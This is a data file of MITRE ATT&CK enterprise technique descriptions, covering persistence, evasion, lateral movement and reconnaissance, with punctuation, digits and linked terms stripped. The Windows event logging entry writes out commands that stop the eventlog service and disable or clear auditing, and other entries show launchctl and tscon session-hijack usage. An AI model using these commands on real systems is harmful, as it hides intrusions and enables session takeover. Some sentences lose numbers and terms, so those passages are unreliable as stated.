attack-pattern--4be89c7c-ace6-4876-9377-c8d54cef3d63,['enterprise-attack'],['T1062'],Hypervisor,  this technique has been deprecated and should no longer be used_    a type   hypervisor is a software layer that sits between the guest operating systems and system's hardware   citation  wikipedia hypervisor  it presents a virtual running environment to an operating system  an example of a common hypervisor is xen   citation  wikipedia xen  a type   hypervisor operates at a level below the operating system and could be designed with  functionality to hide its existence from the guest operating system   citation  myers       a malicious hypervisor of this nature could be used to persist on systems through interruption 
attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0,['enterprise-attack'],['T1497.003'],Time Based Evasion,adversaries may employ various time based methods to detect and avoid virtualization and analysis environments  this may include enumerating time based properties  such as uptime or the system clock  as well as the use of timers or other triggers to avoid a virtual machine environment  vme  or sandbox  specifically those that are automated or only operate for a limited amount of time_  adversaries may employ various time based evasions  such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality  ex   scheduled  delays may also be based on waiting for specific victim conditions to be met  ex  system time  events  etc_  or employ scheduled  multi stage  to avoid analysis and scrutiny_ citation  deloitte environment awareness   benign commands or other operations may also be used to delay malware execution  loops or otherwise needless repetitions of commands  such as  may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments_ citation  revil independence day  citation  netskope nitol  another variation  commonly referred to as api hammering  involves making various calls to  native  functions in order to delay execution  while also potentially overloading analysis environments with junk data _ citation  joe sec nymaim  citation  joe sec trickbot   adversaries may also use time as a metric to detect sandboxes and analysis environments  particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time  for example  an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function_ citation  isaca malware tricks 
attack-pattern--4bf5845d-a814-4490-bc5c-ccdee6043025,['enterprise-attack'],['T1182'],AppCert DLLs,dynamic link libraries  dlls  that are specified in the appcertdlls registry key under hkey_local_machine system currentcontrolset control session manager are loaded into every process that calls the ubiquitously used application programming interface  api  functions createprocess  createprocessasuser  createprocesswithloginw  createprocesswithtokenw  or winexec   citation  elastic process injection july        similar to  process  this value can be abused to obtain persistence and privilege escalation by causing a malicious dll to be loaded and run in the context of separate processes on the computer 
attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49,['enterprise-attack'],['T1218.003'],CMSTP,adversaries may abuse cmstp to proxy execution of malicious code  the microsoft connection manager profile installer  cmstp_exe  is a command line program used to install connection manager service profiles   citation  microsoft connection manager oct       cmstp_exe accepts an installation information file  inf  as a parameter and installs a service profile leveraged for remote access connections_  adversaries may supply cmstp_exe with inf files infected with malicious commands   citation  twitter cmstp usage jan       similar to     squiblydoo   cmstp_exe may be abused to load and execute dlls  citation  msitpros cmstp aug        and or com scriptlets  sct  from remote servers   citation  twitter cmstp jan        citation  github ultimate applocker bypass list   citation  endurant cmstp july       this execution may also bypass applocker and other application control defenses since cmstp_exe is a legitimate binary that may be signed by microsoft_  cmstp_exe can also be abused to  bypass user account  and execute arbitrary commands from a malicious inf through an auto elevated com interface   citation  msitpros cmstp aug        citation  github ultimate applocker bypass list   citation  endurant cmstp july      
attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8,['enterprise-attack'],['T1563.001'],SSH Hijacking,adversaries may hijack a legitimate user's ssh session to move laterally within an environment  secure shell  ssh  is a standard means of remote access on linux and macos systems  it allows a user to connect to another system via an encrypted tunnel  commonly authenticating through a password  certificate or the use of an asymmetric encryption key pair_  in order to move laterally from a compromised host  adversaries may take advantage of trust relationships established with other systems via public key authentication in active ssh sessions by hijacking an existing connection to another system  this may occur through compromising the ssh agent itself or by having access to the agent's socket  if an adversary is able to obtain root access  then hijacking ssh sessions is likely trivial_ citation  slideshare abusing ssh  citation  sshjack blackhat  citation  clockwork ssh agent hijacking  citation  breach post mortem ssh hijack    ssh  differs from use of  because it hijacks an existing ssh session rather than creating a new session using  valid
attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a,['enterprise-attack'],['T1562.002'],Disable Windows Event Logging,adversaries may disable windows event logging to limit data that can be leveraged for detections and audits  windows event logs record user and system activity such as login attempts  process creation  and much more_ citation  windows log events  this data is used by security tools and analysts to generate detections_  the eventlog service maintains event logs from various system components and applications  by default  the service automatically starts when a system powers on  an audit policy  maintained by the local security policy  secpol_msc   defines which system events the eventlog service logs  security audit policy settings can be changed by running secpol_msc  then navigating to security settings local policies audit policy for basic audit policy settings or security settings advanced audit policy configuration for advanced audit policy settings  auditpol_exe may also be used to set audit policies_  adversaries may target system wide logging or just that of a particular application  for example  the eventlog service may be disabled using the following powershell line  stop service  name eventlog  additionally  adversaries may use auditpol and its sub commands in a command prompt to disable auditing or clear the audit policy  to enable or disable a specified setting or audit category  adversaries may use the  success or  failure parameters  for example  auditpol  set  category  account logon   success disable  failure disable turns off auditing for the account logon category  to clear the audit policy  adversaries may run the following lines  auditpol  clear  y or auditpol  remove  allusers_  by disabling windows event logging  adversaries can operate while leaving less evidence of a compromise behind 
attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466,['enterprise-attack'],['T1029'],Scheduled Transfer,adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals  this could be done to blend traffic patterns with normal activity or availability_  when scheduled exfiltration is used  other exfiltration techniques likely apply as well to transfer the information out of the network  such as  exfiltration over c   or  exfiltration over alternative
attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541,['enterprise-attack'],['T1021.002'],SMB/Windows Admin Shares,adversaries may use  valid  to interact with a remote network share using server message block  smb   the adversary may then perform actions as the logged on user_  smb is a file  printer  and serial port sharing protocol for windows machines on the same network or domain  adversaries may use smb to interact with file shares  allowing them to move laterally throughout a network  linux and macos implementations of smb typically use samba_  windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions  example network shares include  c     admin    and  ipc    adversaries may use this technique in conjunction with administrator level  valid  to remotely access a networked system over smb  citation  wikipedia server message block  to interact with systems using remote procedure calls  rpcs   citation  technet rpc  transfer files  and run transferred binaries through remote execution  example execution techniques that rely on authenticated sessions over smb rpc are  scheduled   service  and  windows management  adversaries can also use ntlm hashes to access administrator shares on systems with  pass the  and certain configuration and patch levels_ citation  microsoft admin shares 
attack-pattern--4fd8a28b-4b3a-4cd6-a8cf-85ba5f824a7f,['enterprise-attack'],['T1525'],Implant Internal Image,adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment  amazon web services  aws  amazon machine images  amis   google cloud platform  gcp  images  and azure images as well as popular container runtimes such as docker can be implanted or backdoored  unlike  upload  this technique focuses on adversaries implanting an image in a registry within a victim s environment  depending on how the infrastructure is provisioned  this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image_ citation  rhino labs cloud image backdoor technique sept        a tool has been developed to facilitate planting backdoors in cloud container images_ citation  rhino labs cloud backdoor september       if an adversary has access to a compromised aws instance  and permissions to list the available container images  they may implant a backdoor such as a  web  rhino labs cloud image backdoor technique sept      
attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b,['enterprise-attack'],['T1572'],Protocol Tunneling,adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection network filtering and or enable access to otherwise unreachable systems  tunneling involves explicitly encapsulating a protocol within another  this behavior may conceal malicious traffic by blending in with existing traffic and or provide an outer layer of encryption  similar to a vpn   tunneling could also enable routing of network packets that would otherwise not reach their intended destination  such as smb  rdp  or other traffic that would be filtered by network appliances or not routed over the internet    there are various means to encapsulate a protocol within another protocol  for example  adversaries may perform ssh tunneling  also known as ssh port forwarding   which involves forwarding arbitrary data over an encrypted ssh tunnel_ citation  ssh tunneling     protocol  may also be abused by adversaries during  dynamic  known as dns over https  doh   queries to resolve c  infrastructure may be encapsulated within encrypted https packets_ citation  bleepingcomp godlua jul      adversaries may also leverage  protocol  in conjunction with  and or  protocol  to further conceal c  communications and infrastructure 
attack-pattern--4ff5d6a8-c062-4c68-a778-36fc5edd564f,['enterprise-attack'],['T1218.002'],Control Panel,adversaries may abuse control_exe to proxy execution of malicious payloads  the windows control panel process binary  control_exe  handles execution of control panel items  which are utilities that allow users to view and adjust computer settings_  control panel items are registered executable  _exe  or control panel  _cpl  files  the latter are actually renamed dynamic link library  _dll  files that export a cplapplet function_ citation  microsoft implementing cpl  citation  trendmicro cpl malware jan       for ease of use  control panel items typically include graphical menus available to users after being registered and loaded into the control panel_ citation  microsoft implementing cpl  control panel items can be executed directly from the command line  programmatically via an application programming interface  api  call  or by simply double clicking the file_ citation  microsoft implementing cpl   citation  trendmicro cpl malware jan       citation  trendmicro cpl malware dec        malicious control panel items can be delivered via  campaigns citation  trendmicro cpl malware jan       citation  trendmicro cpl malware dec       or executed as part of multi stage malware_ citation  palo alto reaver nov       control panel items  specifically cpl files  may also bypass application and or file extension allow lists_  adversaries may also rename malicious dll files  _dll  with control panel file extensions  _cpl  and register them to hkcu software microsoft windows currentversion control panel cpls  even when these registered dlls do not comply with the cpl file specification and do not export cplapplet functions  they are loaded and executed through its dllentrypoint when control panel is executed  cpl files not exporting cplapplet are not directly executable_ citation  eset invisimole june      
attack-pattern--4ffc1794-ec3b-45be-9e52-42dbcb2af2de,['enterprise-attack'],['T1599.001'],Network Address Translation Traversal,adversaries may bridge network boundaries by modifying a network device s network address translation  nat  configuration  malicious modifications to nat may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks_  network devices such as routers and firewalls that connect multiple networks together may implement nat during the process of passing packets between networks  when performing nat  the network device will rewrite the source and or destination addresses of the ip address header  some network designs require nat for the packets to cross the border device   a typical example of this is environments where internal networks make use of non internet routable addresses_  when an adversary gains control of a network boundary device  they can either leverage existing nat configurations to send traffic between two separated networks  or they can implement nat configurations of their own design   in the case of network designs that require nat to function  this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device   in the case of network designs that do not require nat  address translation can be used by adversaries to obscure their activities  as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders     adversaries may use  patch system  to change the operating system of a network device  implementing their own custom nat mechanisms to further obscure their activities
attack-pattern--506f6f49-7045-4156-9007-7474cb44ad6d,['enterprise-attack'],['T1608.002'],Upload Tool,adversaries may upload tools to third party or adversary controlled infrastructure to make it accessible during targeting  tools can be open or closed source  free or commercial  tools can be used for malicious purposes by an adversary  but  unlike malware  were not intended to be used for those purposes  ex   adversaries may upload tools to support their operations  such as making a tool available to a victim network to enable  ingress tool  by placing it on an internet accessible web server_  tools may be placed on infrastructure that was previously purchased rented by the adversary   acquire  or was otherwise compromised by them   compromise  dell tg       tools can also be staged on web services  such as an adversary controlled github repo  or on platform as a service offerings that enable users to easily provision applications_ citation  dragos heroku watering hole  citation  malwarebytes heroku skimmers  citation  intezer app service phishing   adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third party hosting location  ex  a non adversary controlled github repo   including the original hosting site of the tool 
attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462,['enterprise-attack'],['T1547.005'],Security Support Provider,adversaries may abuse security support providers  ssps  to execute dlls when the system boots  windows ssp dlls are loaded into the local security authority  lsa  process at system start  once loaded into the lsa  ssp dlls have access to encrypted and plaintext passwords that are stored in windows  such as any logged on user's domain password or smart card pins_  the ssp configuration is stored in two registry keys  hklm system currentcontrolset control lsa security packages and hklm system currentcontrolset control lsa osconfig security packages  an adversary may modify these registry keys to add new ssps  which will be loaded the next time the system boots  or when the addsecuritypackage windows api function is called_ citation  graeber      
attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79,['enterprise-attack'],['T1004'],Winlogon Helper DLL,winlogon_exe is a windows component responsible for actions at logon logoff as well as the secure attention sequence  sas  triggered by ctrl alt delete  registry entries in hklm software  wow    node  microsoft windows nt currentversion winlogon  and hkcu software microsoft windows nt currentversion winlogon  are used to manage additional helper programs and functionalities that support winlogon   citation  cylance reg persistence sept         malicious modifications to these registry keys may cause winlogon to load and execute malicious dlls and or executables  specifically  the following subkeys have been known to be possibly vulnerable to abuse   citation  cylance reg persistence sept          winlogon notify   points to notification package dlls that handle winlogon events   winlogon userinit   points to userinit_exe  the user initialization program executed when a user logs on   winlogon shell   points to explorer_exe  the system shell executed when a user logs on  adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence 
attack-pattern--519630c5-f03f-4882-825c-3af924935817,['enterprise-attack'],['T1009'],Binary Padding,adversaries can use binary padding to add junk data and change the on disk representation of malware without affecting the functionality or behavior of the binary  this will often increase the size of the binary beyond what some security tools are capable of handling due to file size limitations_  binary padding effectively changes the checksum of the file and can also be used to avoid hash based blacklists and static anti virus signatures_ citation  eset oceanlotus  the padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware_ citation  securelist malware tricks april       increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files  this may also reduce the likelihood of being collected for analysis  public file scanning services  such as virustotal  limits the maximum size of an uploaded file to be analyzed_ citation  virustotal faq 
attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814,['enterprise-attack'],['T1550'],Use Alternate Authentication Material,adversaries may use alternate authentication material  such as password hashes  kerberos tickets  and application access tokens  in order to move laterally within an environment and bypass normal system access controls    authentication processes generally require a valid identity  e_g_  username  along with one or more authentication factors  e_g_  password  pin  physical smart card  token generator  etc_   alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor s   alternate authentication material may also be generated during the identity creation process_ citation  nist authentication  citation  nist mfa   caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor s   because the alternate authentication must be maintained by the system either in memory or on disk it may be at risk of being stolen through  credential  techniques  by stealing alternate authentication material  adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors_
attack-pattern--51dea151-0898-4a45-967c-3ebee0420484,['enterprise-attack'],['T1076'],Remote Desktop Protocol,remote desktop is a common feature in operating systems  it allows a user to log into an interactive session with a system desktop graphical user interface on a remote system  microsoft refers to its implementation of the remote desktop protocol  rdp  as remote desktop services  rds    citation  technet remote desktop services  there are other implementations and third party tools that provide graphical access  remote  similar to rds_  adversaries may connect to a remote system over rdp rds to expand access if the service is enabled and allows access to accounts with known credentials  adversaries will likely use credential access techniques to acquire credentials to use with rdp  adversaries may also use rdp in conjunction with the  accessibility  technique for persistence   citation  alperovitch malware   adversaries may also perform rdp session hijacking which involves stealing a legitimate user's remote session  typically  a user is notified when someone else is trying to steal their session and prompted with a question  with system permissions and using terminal services console  c  windows system   tscon_exe  session number to be stolen   an adversary can hijack a session without the need for credentials or prompts to the user   citation  rdp hijacking korznikov  this can be done remotely or locally and with active or disconnected sessions   citation  rdp hijacking medium  it can also lead to  remote system  and privilege escalation by stealing a domain admin or higher privileged account session  all of this can be done by using native windows commands  but it has also been added as a feature in redsnarf   citation  kali redsnarf 
attack-pattern--51e54974-a541-4fb6-a61b-0518e4c6de41,['enterprise-attack'],['T1597.001'],Threat Intel Vendors,adversaries may search private data from threat intelligence vendors for information that can be used during targeting  threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported  although sensitive details  such as customer names and other identifiers  may be redacted  this information may contain trends regarding breaches such as target industries  attribution claims  and successful ttps countermeasures_ citation  d secutrity cti feeds   adversaries may search in private threat intelligence vendor data to gather actionable information  threat actors may seek information indicators gathered about their own campaigns  as well as those conducted by other adversaries that may align with their target industries  capabilities objectives  or other operational concerns  information reported by vendors may also reveal opportunities other forms of reconnaissance  ex   search open  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   exploit public facing  or  external remote
attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87,['enterprise-attack'],['T1011'],Exfiltration Over Other Network Medium,adversaries may attempt to exfiltrate data over a different network medium than the command and control channel  if the command and control network is a wired internet connection  the exfiltration may occur  for example  over a wifi connection  modem  cellular data connection  bluetooth  or another radio frequency  rf  channel_  adversaries may choose to do this if they have sufficient access or proximity  and the connection might not be secured or defended as well as the primary internet connected channel because it is not routed through the same enterprise network 
attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd,['enterprise-attack'],['T1602.002'],Network Device Configuration Dump,adversaries may access network configuration files to collect sensitive data about the device and the network  the network configuration is a file containing parameters that determine the operation of the device  the device typically stores an in memory copy of the configuration while operating  and a separate configuration on non volatile storage to load after device reset  adversaries can inspect the configuration files to reveal information about the target network and its layout  the network device and its software  or identifying legitimate accounts and credentials for later use_  adversaries can use common management tools and protocols  such as simple network management protocol  snmp  and smart install  smi   to access network configuration files_ citation  us cert ta      a network infrastructure devices       citation  cisco blog legacy device attacks  these tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis 
attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4,['enterprise-attack'],['T1589'],Gather Victim Identity Information,adversaries may gather information about the victim's identity that can be used during targeting  information about identities may include a variety of details  including personal data  ex  employee names  email addresses  etc_  as well as sensitive details such as credentials_  adversaries may gather this information in various ways  such as direct elicitation via  phishing for  information about users could also be enumerated via other active means  i_e   active  such as probing and analyzing responses from authentication services that may reveal valid usernames in a system_ citation  grimblog usernameenum  information about victims may also be exposed to adversaries via online or other accessible data sets  ex   social  or  search victim owned  opm leak  citation  register deloitte  citation  register uber  citation  detectify slack tokens  citation  forbes github creds  citation  github trufflehog  citation  github gitrob  citation  cnet leaks   gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open  or  phishing for  establishing operational resources  ex   compromise  and or initial access  ex   or  valid
attack-pattern--52d40641-c480-4ad5-81a3-c80ccaddf82d,['enterprise-attack'],['T1131'],Authentication Package,windows authentication package dlls are loaded by the local security authority  lsa  process at system start  they provide support for multiple logon processes and multiple security protocols to the operating system   citation  msdn authentication packages   adversaries can use the autostart mechanism provided by lsa authentication packages for persistence by placing a reference to a binary in the windows registry location hklm system currentcontrolset control lsa  with the key value of  authentication packages    the binary will then be executed by the system when the authentication packages are loaded 
attack-pattern--52f3d5a6-8a0f-4f82-977e-750abf90d0b0,['enterprise-attack'],['T1181'],Extra Window Memory Injection,before creating a window  graphical windows based processes must prescribe to or register a windows class  which stipulate appearance and behavior  via windows procedures  which are functions that handle input output of data    citation  microsoft window classes  registration of new windows classes can include a request for up to    bytes of extra window memory  ewm  to be appended to the allocated memory of each instance of that class  this ewm is intended to store data specific to that window and has specific application programming interface  api  functions to set and get its value   citation  microsoft getwindowlong function   citation  microsoft setwindowlong function   although small  the ewm is large enough to store a    bit pointer and is often used to point to a windows procedure  malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process s memory  placing a pointer to the code in ewm  then invoking execution by returning execution control to the address in the process s ewm_  execution granted through ewm injection may take place in the address space of a separate live process  similar to  process  this may allow access to both the target process's memory and possibly elevated privileges  writing payloads to shared sections also avoids the use of highly monitored api calls such as writeprocessmemory and createremotethread   citation  elastic process injection july       more sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention  dep  by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process   citation  malwaretech power loader aug        citation  welivesecurity gapz and redyms mar      
attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b,['enterprise-attack'],['T1562.004'],Disable or Modify System Firewall,adversaries may disable or modify system firewalls in order to bypass controls limiting network usage  changes could be disabling the entire mechanism as well as adding  deleting  or modifying particular rules  this can be done numerous ways depending on the operating system  including via command line  editing windows registry keys  and windows control panel_  modifying or disabling a system firewall may enable adversary c  communications  lateral movement  and or data exfiltration that would otherwise not be allowed 
attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a,['enterprise-attack'],['T1560'],Archive Collected Data,an adversary may compress and or encrypt data that is collected prior to exfiltration  compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network  encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender_  both compression and encryption are done prior to exfiltration  and can be performed using a utility   rd party library  or custom method 
attack-pattern--53bfc8bf-8f76-4cd7-8958-49a884ddb3ee,['enterprise-attack'],['T1152'],Launchctl,launchctl controls the macos launchd process which handles things like launch agents and launch daemons  but can execute other commands or programs itself  launchctl supports taking subcommands on the command line  interactively  or even redirected from standard input  by loading or reloading launch agents or launch daemons  adversaries can install persistence or execute changes they made   citation  sofacy komplex trojan   running a command from launchctl is as simple as launchctl submit  l      path to thing to execute  arg   arg   arg   loading  unloading  or reloading launch agents or launch daemons can require elevated privileges    adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process 
attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc,['enterprise-attack'],['T1553.003'],SIP and Trust Provider Hijacking,adversaries may tamper with sip and trust provider components to mislead the operating system and application control tools when conducting signature validation checks  in user mode  windows authenticode  citation  microsoft authenticode  digital signatures are used to verify a file's origin and integrity  variables that may be used to establish trust in signed code  ex  a driver with a valid microsoft signature may be handled as safe   the signature validation process is handled via the winverifytrust application programming interface  api  function    citation  microsoft winverifytrust  which accepts an inquiry and coordinates with the appropriate trust provider  which is responsible for validating parameters of a signature   citation  spectorops subverting trust sept        because of the varying executable file types and corresponding signature formats  microsoft created software components called subject interface packages  sips   citation  eduardosblog sips july       to provide a layer of abstraction between api functions and files  sips are responsible for enabling api functions to create  retrieve  calculate  and verify signatures  unique sips exist for most file formats  executable  powershell  installer  etc_  with catalog signing providing a catch all   citation  microsoft catalog files and signatures april        and are identified by globally unique identifiers  guids    citation  spectorops subverting trust sept        similar to  code  adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system  adversaries may hijack sip and trust provider components to mislead operating system and application control tools to classify malicious  or any  code as signed by   citation  spectorops subverting trust sept          modifying the dll and funcname registry values in hklm software  wow    node  microsoft cryptography oid encodingtype   cryptsipdllgetsigneddatamsg  sip_guid  that point to the dynamic link library  dll  providing a sip s cryptsipdllgetsigneddatamsg function  which retrieves an encoded digital certificate from a signed file  by pointing to a maliciously crafted dll with an exported function that always returns a known good signature value  ex  a microsoft signature for portable executables  rather than the file s real signature  an adversary can apply an acceptable signature value to all files using that sip  citation  github sip poc sept        although a hash mismatch will likely occur  invalidating the signature  since the hash returned by the function will not match the value computed from the file _   modifying the dll and funcname registry values in hklm software  wow    node  microsoft cryptography oid encodingtype   cryptsipdllverifyindirectdata  sip_guid  that point to the dll providing a sip s cryptsipdllverifyindirectdata function  which validates a file s computed hash against the signed hash value  by pointing to a maliciously crafted dll with an exported function that always returns true  indicating that the validation was successful   an adversary can successfully validate any file  with a legitimate signature  using that sip  citation  github sip poc sept        with or without hijacking the previously mentioned cryptsipdllgetsigneddatamsg function   this registry value could also be redirected to a suitable exported function from an already present dll  avoiding the requirement to drop and execute a new file on disk_   modifying the dll and function registry values in hklm software  wow    node  microsoft cryptography providers trust finalpolicy  trust provider guid  that point to the dll providing a trust provider s finalpolicy function  which is where the decoded and parsed signature is checked and the majority of trust decisions are made  similar to hijacking sip s cryptsipdllverifyindirectdata function  this value can be redirected to a suitable exported function from an already present dll or a maliciously crafted dll  though the implementation of a trust provider is complex _     note    the above hijacks are also possible without modifying the registry via  dll search order   hijacking sip or trust provider components can also enable persistent code execution  since these malicious components may be invoked by any application that performs code signing or signature validation   citation  spectorops subverting trust sept      
attack-pattern--54456690-84de-4538-9101-643e26437e09,['enterprise-attack'],['T1483'],Domain Generation Algorithms,adversaries may make use of domain generation algorithms  dgas  to dynamically identify a destination for command and control traffic rather than relying on a list of static ip addresses or domains  this has the advantage of making it much harder for defenders block  track  or take over the command and control channel  as there potentially could be thousands of domains that malware can check for instructions_ citation  cybereason dissecting dgas  citation  cisco umbrella dga  citation  unit    dga feb        dgas can take the form of apparently random or  gibberish  strings  ex  istgmxdejdnxuyla_ru  when they construct domain names by generating each letter  alternatively  some dgas employ whole words as the unit by concatenating words together instead of letters  ex  cityjulydish_net   many dgas are time based  generating a different domain for each time period  hourly  daily  monthly  etc   others incorporate a seed value as well to make predicting future domains more difficult for defenders_ citation  cybereason dissecting dgas  citation  cisco umbrella dga  citation  talos ccleanup       citation  akamai dga mitigation   adversaries may use dgas for the purpose of  fallback  when contact is lost with the primary command and control server malware may employ a dga as a means to reestablishing command and control_ citation  talos ccleanup       citation  fireeye poshspy april       citation  eset sednit      activity 
attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47,['enterprise-attack'],['T1185'],Browser Session Hijacking,adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content  modify user behaviors  and intercept information as part of various browser session hijacking techniques_ citation  wikipedia man in the browser   a specific example is when an adversary injects software into a browser that allows them to inherit cookies  http sessions  and ssl client certificates of a user then use the browser as a way to pivot into an authenticated intranet_ citation  cobalt strike browser pivot  citation  icebrg chrome extensions  executing browser based behaviors such as pivoting may require specific process permissions  such as sedebugprivilege and or high integrity administrator rights_  another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic  this does not alter the user's traffic in any way  and the proxy connection can be severed as soon as the browser is closed  the adversary assumes the security context of whichever browser process the proxy is injected into  browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly  with these permissions  an adversary could potentially browse to any resource on an intranet  such as  or webmail  that is accessible through the browser and which the browser has sufficient permissions  browser pivoting may also bypass security provided by   factor authentication_ citation  cobaltstrike manual 
attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba,['enterprise-attack'],['T1021'],Remote Services,adversaries may use  valid  to log into a service specifically designed to accept remote connections  such as telnet  ssh  and vnc  the adversary may then perform actions as the logged on user_  in an enterprise environment  servers and workstations can be organized into domains  domains provide centralized identity management  allowing users to login using one set of credentials across the entire network  if an adversary is able to obtain a set of valid domain credentials  they could login to many different machines using remote access protocols such as secure shell  ssh  or remote desktop protocol  rdp _ citation  ssh secure shell  citation  technet remote desktop services   legitimate applications  such as  software deployment  and other administrative programs  may utilize  remote  to access remote hosts  for example  apple remote desktop  ard  on macos is native software used for remote management  ard leverages a blend of protocols  including  to send the screen and control buffers and  for secure file transfer_ citation  remote management mdm macos  citation  kickstart apple remote desktop commands  citation  apple remote desktop admin guide  _   adversaries can abuse applications such as ard to gain remote code execution and perform lateral movement  in versions of macos prior to   _    an adversary can escalate an ssh session to an ard session which enables an adversary to accept tcc  transparency  consent  and control  prompts without user interaction and gain access to data_ citation  fireeye      apple remote desktop  citation  lockboxx ard       citation  kickstart apple remote desktop commands 
attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b,['enterprise-attack'],['T1071.003'],Mail Protocols,adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection network filtering by blending in with existing traffic  commands to the remote system  and often the results of those commands  will be embedded within the protocol traffic between the client and server    protocols such as smtp s  pop  s  and imap that carry electronic mail may be very common in environments   packets produced from these protocols may have many fields and headers in which data can be concealed  data could also be concealed within the email messages themselves  an adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal  expected traffic 
attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f,['enterprise-attack'],['T1556.007'],Hybrid Identity,adversaries may patch  modify  or otherwise backdoor cloud authentication processes that are tied to on premises user identities in order to bypass typical authentication mechanisms  access credentials  and enable persistent access to accounts     many organizations maintain hybrid user and device identities that are shared between on premises and cloud based environments  these can be maintained in a number of ways  for example  azure ad includes three options for synchronizing identities between active directory and azure ad citation  azure ad hybrid identity      password hash synchronization  phs   in which a privileged on premises account synchronizes user password hashes between active directory and azure ad  allowing authentication to azure ad to take place entirely in the cloud    pass through authentication  pta   in which azure ad authentication attempts are forwarded to an on premises pta agent  which validates the credentials against active directory    active directory federation services  ad fs   in which a trust relationship is established between active directory and azure ad   ad fs can also be used with other saas and cloud platforms such as aws and gcp  which will hand off the authentication process to ad fs and receive a token containing the hybrid users  identity and privileges    by modifying authentication processes tied to hybrid identities  an adversary may be able to establish persistent privileged access to cloud resources  for example  adversaries who compromise an on premises server running a pta agent may inject a malicious dll into the  azureadconnectauthenticationagentservice  process that authorizes all attempts to authenticate to azure ad  as well as records user credentials_ citation  azure ad connect for read teamers  citation  aadinternals azure ad on prem to cloud  in environments using ad fs  an adversary may edit the  microsoft_identityserver_servicehost  configuration file to load a malicious dll that generates authentication tokens for any user with any set of claims  thereby bypassing multi factor authentication and defined ad fs policies_  in some cases  adversaries may be able to modify the hybrid identity authentication process from the cloud  for example  adversaries who compromise a global administrator account in an azure ad tenant may be able to register a new pta agent via the web console  similarly allowing them to harvest credentials and log into the azure ad environment as any user_ citation  mandiant azure ad backdoors 
attack-pattern--5502c4e9-24ef-4d5f-8ee9-9e906c2f82c4,['enterprise-attack'],['T1595.002'],Vulnerability Scanning,adversaries may scan victims for vulnerabilities that can be used during targeting  vulnerability scans typically check if the configuration of a target host application  ex  software and version  potentially aligns with the target of a specific exploit the adversary may seek to use_  these scans may also include more broad attempts to  gather victim host  that can be used to identify more commonly known  exploitable vulnerabilities  vulnerability scans typically harvest running software and version numbers via server banners  listening ports  or other network artifacts_ citation  owasp vuln scanning  information from these scans may reveal opportunities for other forms of reconnaissance  ex   search open  or  search open technical  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   exploit public facing
attack-pattern--55fc4df0-b42c-479a-b860-7a6761bcaad0,['enterprise-attack'],['T1596'],Search Open Technical Databases,adversaries may search freely available technical databases for information about victims that can be used during targeting  information about victims may be available in online databases and repositories  such as registrations of domains certificates as well as public collections of network data artifacts gathered from traffic and or scans_ citation  dns dumpster  citation  circl passive dns  citation  medium ssl cert  citation  sslshopper lookup  citation  digitalshadows cdn   adversaries may search in different open databases depending on what information they seek to gather  information from these sources may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex   external remote  or  trusted
